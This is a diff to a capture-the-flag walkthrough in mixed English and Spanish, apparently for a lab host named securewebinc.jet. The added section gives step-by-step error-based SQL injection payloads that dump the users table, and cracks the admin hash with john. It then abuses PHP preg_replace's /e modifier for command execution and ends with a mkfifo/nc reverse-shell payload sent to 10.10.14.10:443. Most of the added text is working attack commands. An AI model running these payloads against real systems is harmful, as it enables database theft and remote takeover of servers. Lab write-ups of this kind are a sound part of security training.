@@ -136,7 +136,7 @@ $ echo "10.13.37.10 www.securewebinc.jet" | sudo tee -a /etc/hosts
 By visiting the web this time from dominio the bottom we can again `flag`
 
 
-![Second Flag](02.jpeg){: width="1200" height="800" }
+![Second Flag](02.png){: width="1200" height="800" }
 
 ## Going Deeper
 In the `codigo` page source we can see that it loads 2 files with extension `js` , one is the template and the other has a rather interesting name: `secure.js`
@@ -330,3 +330,94 @@ Based on an [article](https://securiumsolutions.com/blog/sql-injection-by-double
 It should be noted that to send it we need `url condearlo` to do it from burpsuite with `Ctrl U` , we send and see in the response `jetadmin`
 
 ![jetadmin](12.png){: width="1200" height="800" }
+
+We follow the same logic to read the databases, as it returns several results we will limit ourselves to one with `limit 0,1` , we see `information_schema`
+
+```console
+' or (select 1 from(select count(*),concat((select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
+```
+
+![jetadmin](13.png){: width="1200" height="800" }
+
+We can concatenate several `querys` so we add a 0x20 for a space and copy it `query` this time changing `0,1 it 1,1` to to see both results
+
+```console
+' or (select 1 from(select count(*),concat((select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),0x20,(select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 1,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
+```
+
+![jetadmin](14.png){: width="1200" height="800" }
+
+There is only the database jetadmin so we will list itstablas
+
+```console
+' or (select 1 from(select count(*),concat((select mid((ifnull(cast(table_name as nchar),0x20)),1,54) from information_schema.tables where table_schema='jetadmin' limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
+```
+
+![jetadmin](15.png){: width="1200" height="800" }
+
+In the database jetadmin there is only the table users , so we can list its columnas , in this case we only found 3 id , username and password
+
+```console
+' or (select 1 from(select count(*),concat((select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 0,1),0x20,(select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 1,1),0x20,(select mid((ifnull(cast(column_name as nchar),0x20)),1,54) from information_schema.columns where table_schema='jetadmin' limit 2,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
+```
+
+![jetadmin](16.png){: width="1200" height="800" }
+
+Finally we dump the columns `username` and `password` separate them by :
+
+
+```console
+' or (select 1 from(select count(*),concat((select mid((ifnull(cast(username as nchar),0x20)),1,54) from users limit 0,1),0x3a,(select mid((ifnull(cast(password as nchar),0x20)),1,54) from users limit 0,1),0x20,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- -
+```
+![jetadmin](17.png){: width="1200" height="800" }
+
+We have the hash admin, we pass it to john and we get its password
+
+```console
+$ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-SHA256  
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 XOP 4x2])
+Warning: poor OpenMP scalability for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Hackthesystem200 (?)
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed.
+```
+We can log in adminwith the credentials adminwe got
+
+![jetadmin](18.png){: width="1200" height="800" }
+
+Now we can see a dashboard and in one of the messages we find the flag
+
+![jetadmin](19.png){: width="1200" height="800" }
+
+## Command
+
+In the dashboard among other things we see a field where we can sendcorreos
+
+![jetadmin](20.png){: width="1200" height="800" }
+
+So we send an email simply filling in all the fields with test, when sending it it tells us to modify the message to pass the profanity filter
+
+![jetadmin](21.png){: width="1200" height="800" }
+
+Interceptando la petición además de nuestros campos ingresados podemos ver varios con swearwords como prefix, y las cambia por otras palabras, tambien vemos usa /i
+
+![jetadmin](22.png){: width="1200" height="800" }
+
+Leyendo un [articel](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) sobre la función preg_replace() podemos ver que /i se usa para que sea case insentitive pero podemos usar /e como interprete de php, asi que podemos cambiarlo e inyectar codigo php para que nos ejecute el comando id
+
+```console
+swearwords[/fuck/i]=make+love
+swearwords[/fuck/e]=system('id')
+```
+We can remove unnecessary fields, by changing our data to execute the command id we can see the user output reflected www-data
+
+
+![jetadmin](23.png){: width="1200" height="800" }
+
+We change our id for a payload with mkfifo y nc to send a revshell and our data is the following, there are special characters so we urlencode it
+
+```console
+$ swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.10+443+>/tmp/f')&to=test@test.com&subject=test&message=fuck&_wysihtml5_mode=1
+```
